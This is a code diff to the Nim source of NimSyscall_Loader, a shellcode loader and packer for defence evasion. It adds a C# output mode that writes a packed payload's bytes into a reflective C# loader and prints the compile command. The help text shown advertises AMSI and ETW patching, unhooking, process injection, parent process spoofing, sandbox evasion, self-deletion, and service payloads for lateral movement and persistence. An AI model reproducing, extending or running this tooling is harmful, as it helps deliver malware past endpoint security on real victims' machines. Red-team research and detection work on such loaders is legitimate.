@@ -31,6 +31,7 @@ import CurrentProcInject
 import RemoteProcInject
 import DInvoke
 import Powershell
+import CSharp
 import AntiDebug
 
 
@@ -67,7 +68,7 @@ let helpmenu = """
 NimSyscall_Loader v 2.1
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --Caro-Kann --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --Caro-Kann --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -103,6 +104,7 @@ Options:
   --psout    Powershell Output format, reflectively loading the packed binary
     --psobfs    Pre-obfuscated Powershell Template with Invoke-obfuscation.
     --pslyrics    Add Lyrics as comments to avoid some more detections
+  --csout    C# Output format, reflectively loading the packed binary
   --sourceonly    Dont compile but just create the source code and compile command
   --RWX    Use RWX memory permissions for Shellcode and PE-Loading (instead of default RX)
   --service    Create a Service binary or DLL, which can be used for Lateral Movement or Persistence
@@ -241,6 +243,7 @@ var
     dllProxy: bool = false
     noNimMain: bool = false
     psout: bool = false
+    csout: bool = false
     uselyrics: bool = false
     psobfs: bool = false
     cpl: bool = false
@@ -402,6 +405,10 @@ if args["--noAntiEmulate"]:
 
 if args["--psout"]:
     psout = true
+    reflective = true
+
+if args["--csout"]:
+    csout = true
     reflective = true
 
 if args["--psobfs"]:
@@ -4064,7 +4071,7 @@ if(macPayload):
 if(unhook):
     basicCompileFlags.add("-d:unhook ")
 
-if(psout):
+if(psout or csout):
     basicCompileFlags.add("-d:powershell ")
 
 if(useQueueAPC):
@@ -4261,8 +4268,8 @@ echo basicCompileFlags
 echo "\n\n"
 
 if(sourceonly):
-    if(psout or dllproxy or denim or replace or dllclone):
-        echo "[!] You specified one of psout, dllproxy, dllclone, denim or replace. That has to be done by yourself as you also specified sourceonly."
+    if(psout or dllproxy or denim or replace or dllclone or csout):
+        echo "[!] You specified one of psout, csout, dllproxy, dllclone, denim or replace. That has to be done by yourself as you also specified sourceonly."
     quit()
 
 when system.hostOS == "windows":
@@ -4399,9 +4406,35 @@ proc WritePS1() =
 
         writeFile(fmt"{outfile}.ps1", script)
     else:
-        echo fmt"[!] File {outfile}.ps1 not found, skipping byte list creation"
+        echo fmt"[!] File {outfile} not found, skipping byte list creation"
 
 
+# we need a function here, that takes the output file and retrieves a list of all bytes from it separated with a "," and then replaces the egg string QWERQWERQWER in the loader.cs file of the current directory
+proc WriteCS() =
+    var exists: bool = true
+    try:
+        var fileCheck = readFile(fmt"{outfile}")
+    except:
+        exists = false
+    if(exists):
+        var file = open(fmt"{outfile}", fmRead)
+        var bytes: seq[byte] = toByteSeq(file.readAll())
+        file.close()
+        var length: int = len(bytes) - 1
+        var byteList: string = ""
+        for i in 0..length:
+            byteList.add(fmt"{bytes[i]},")
+        byteList = byteList[0..^2]
+        var script: string = CStemplate
+        script = script.replace("QWERQWERQWER", byteList)
+        writeFile(fmt"{outfile}.cs", script)
+        echo fmt"[!] Loader saved to {outfile}.cs"
+        # Print, that this can be compiled with csc.exe but add the unsafe code option. Give the exact command to compile it.
+        echo "[!] You can compile this with csc.exe but you need to add the unsafe code option. The command to compile it is:"
+        echo fmt"csc.exe /unsafe {outfile}.cs"
+
+    else:
+        echo fmt"[!] File {outfile} not found, skipping byte list creation"
 
 if(replace):
     replaceList()
@@ -4478,11 +4511,13 @@ if(exists):
 
     if (dllProxy):
         echo fmt"[!] Original DLL saved as {randValue}.dll - you need to copy both files into the target directory to have a working payload ;-)"
+    if(csout):
+        WriteCS()
+
     if(psout):
         WritePS1()
         echo "\r\nPowershell script saved to: " & fmt"{outfile}.ps1"
-        # Todo: Obfuscate the Script by replacing all VAR0001 to VAR0999 variables with random strings as well as FUN001 to FUN999 functions, ERROR01 to ERROR99 error messages and so on
-
+      
 
 
 
